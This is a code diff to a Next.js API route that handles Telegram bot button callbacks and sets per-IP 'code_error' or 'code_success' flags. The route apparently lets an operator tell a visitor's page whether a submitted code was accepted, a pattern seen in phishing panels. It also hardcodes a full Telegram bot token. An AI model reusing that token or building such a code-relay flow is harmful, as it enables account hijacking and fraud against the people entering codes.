@@ -1,5 +1,5 @@
 import { NextRequest, NextResponse } from 'next/server';
-import { setCodeErrorFlag, setCodeSuccessFlag } from '../codeErrorStore';
+import { setCodeErrorFlag, setCodeSuccessFlag, clearCodeFlags } from '../codeErrorStore';
 
 const TELEGRAM_TOKEN = '7962685508:AAHBZMDWD4hqHYVzjjDfv4pjMAZ6aMwAvTc';
 
@@ -24,7 +24,23 @@ export async function POST(req: NextRequest) {
     console.log('Extracted IP:', ip);
     console.log('Callback data:', body.callback_query.data);
 
-    // Сначала отправляем ответ в Telegram
+    // Сначала очищаем все флаги для этого IP
+    clearCodeFlags(ip);
+
+    // Затем устанавливаем соответствующий флаг
+    if (body.callback_query.data === 'code_error') {
+      console.log('Processing code_error callback');
+      setCodeErrorFlag(ip, true);
+      console.log('Set code error flag for IP:', ip);
+    } else if (body.callback_query.data === 'code_success') {
+      console.log('Processing code_success callback');
+      setCodeSuccessFlag(ip, true);
+      console.log('Set code success flag for IP:', ip);
+    } else {
+      console.log('Unknown callback data:', body.callback_query.data);
+    }
+
+    // Отправляем ответ в Telegram
     const answerUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`;
     const response = await fetch(answerUrl, {
       method: 'POST',
@@ -41,19 +57,6 @@ export async function POST(req: NextRequest) {
     if (!response.ok) {
       console.error('Failed to send answer to Telegram:', responseData);
       return NextResponse.json({ ok: false, error: 'Failed to send answer to Telegram' }, { status: 500 });
-    }
-
-    // Затем устанавливаем соответствующий флаг
-    if (body.callback_query.data === 'code_error') {
-      console.log('Processing code_error callback');
-      setCodeErrorFlag(ip, true);
-      console.log('Set code error flag for IP:', ip);
-    } else if (body.callback_query.data === 'code_success') {
-      console.log('Processing code_success callback');
-      setCodeSuccessFlag(ip, true);
-      console.log('Set code success flag for IP:', ip);
-    } else {
-      console.log('Unknown callback data:', body.callback_query.data);
     }
     
     return NextResponse.json({ ok: true });
